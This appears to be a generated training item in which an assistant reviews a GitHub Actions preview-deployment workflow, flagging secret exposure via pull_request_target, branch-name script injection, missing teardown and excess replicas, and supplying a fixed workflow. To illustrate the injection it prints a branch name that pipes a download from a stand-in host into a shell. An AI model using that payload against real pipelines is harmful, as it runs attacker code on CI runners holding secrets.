@@ -1,0 +1,107 @@
+id: gen-12764612-00462-review
+category: review
+language: yaml
+patterns:
+- minimize-environments
+facts:
+- F-PREVIEW-ENV
+messages:
+- role: user
+  content: |
+    review
+
+    ```yaml
+    name: Preview
+    on:
+      pull_request_target:
+        types: [opened, synchronize, reopened]
+
+    env:
+      REPLICAS: 3
+
+    jobs:
+      preview:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+            with:
+              ref: ${{ github.event.pull_request.head.sha }}
+          - name: Deploy playground preview
+            env:
+              SSH_KEY: ${{ secrets.PREVIEW_SSH_KEY }}
+            run: |
+              echo "$SSH_KEY" > key && chmod 600 key
+              NAME=pr-${{ github.event.pull_request.head.ref }}
+              ./ci/preview.sh up "$NAME" --replicas "$REPLICAS" --key key
+              echo "Preview: https://$NAME.preview.acme.dev"
+    ```
+- role: assistant
+  content: |
+    **Workload:** cloud backend (CI-driven preview environments for the CLI tool's playground)
+
+    #### [Security] Untrusted PR code runs with your deploy key
+    - **Where:** `pull_request_target` plus `checkout` of `head.sha`
+    - **Issue:** `pull_request_target` runs with repo secrets. You then check out the PR's code and run `./ci/preview.sh` from it. Anyone who can open a PR can change that script and read `PREVIEW_SSH_KEY`.
+    - **Fix:** use the `pull_request` trigger. Fork PRs get no secrets, so only deploy previews for PRs from the same repo (see the workflow below).
+
+    #### [Security] Script injection through the branch name
+    - **Where:** `NAME=pr-${{ github.event.pull_request.head.ref }}`
+    - **Issue:** the branch name is pasted into the shell script before it runs. A branch named like `x$(curl evil.sh|sh)` runs commands on the runner.
+    - **Fix:** pass values through `env:` and use the PR number, which is safe and unique.
+
+    #### [High] Previews are never removed
+    - **Where:** `types: [opened, synchronize, reopened]`, no `closed` handling
+    - **Issue:** every PR gets an environment, and nothing deletes it after merge or close. They keep running until someone cleans up by hand. With a branch-name based `NAME`, a renamed branch also leaves the old environment behind.
+    - **Fix:** add `closed` to the trigger and a teardown job (below). Name the environment by PR number, so each push updates the same one.
+    - **Impact:** E and M, on every PR. In Green Metrics Tool micro-benchmarks, an idle preview environment (3 app replicas, Postgres, Redis, a worker) and a trimmed one (1 replica and Postgres) differed by only about 3% CPU energy over 60 seconds. The saving comes from environments that no longer exist, not from trimming a running one.
+
+    #### [Medium] 3 replicas for a preview
+    - **Where:** `REPLICAS: 3`
+    - **Issue:** a preview serves a reviewer or two. Extra replicas reserve memory and host capacity for no benefit.
+    - **Fix:** `--replicas 1`.
+    - **Impact:** M, mainly. The CPU difference while idle is small, so do this after teardown.
+
+    Fixed workflow:
+
+    ```yaml
+    name: Preview
+    on:
+      pull_request:
+        types: [opened, synchronize, reopened, closed]
+
+    jobs:
+      deploy:
+        if: github.event.action != 'closed' && github.event.pull_request.head.repo.full_name == github.repository
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - name: Deploy playground preview
+            env:
+              SSH_KEY: ${{ secrets.PREVIEW_SSH_KEY }}
+              NAME: pr-${{ github.event.pull_request.number }}
+            run: |
+              install -m 600 /dev/null key
+              printf '%s\n' "$SSH_KEY" > key
+              ./ci/preview.sh up "$NAME" --replicas 1 --key key
+              echo "Preview: https://$NAME.preview.acme.dev"
+
+      teardown:
+        if: github.event.action == 'closed' && github.event.pull_request.head.repo.full_name == github.repository
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - name: Remove preview
+            env:
+              SSH_KEY: ${{ secrets.PREVIEW_SSH_KEY }}
+              NAME: pr-${{ github.event.pull_request.number }}
+            run: |
+              install -m 600 /dev/null key
+              printf '%s\n' "$SSH_KEY" > key
+              ./ci/preview.sh down "$NAME" --key key
+    ```
+
+    Make sure `preview.sh down` is safe to run twice, so a re-run of the job does not fail.
+
+    **Already good:** the deploy key comes from a secret and is written with `chmod 600`, and the preview URL is printed in the job log.
+verify:
+  static_only: GitHub Actions workflow, needs GitHub and a remote host
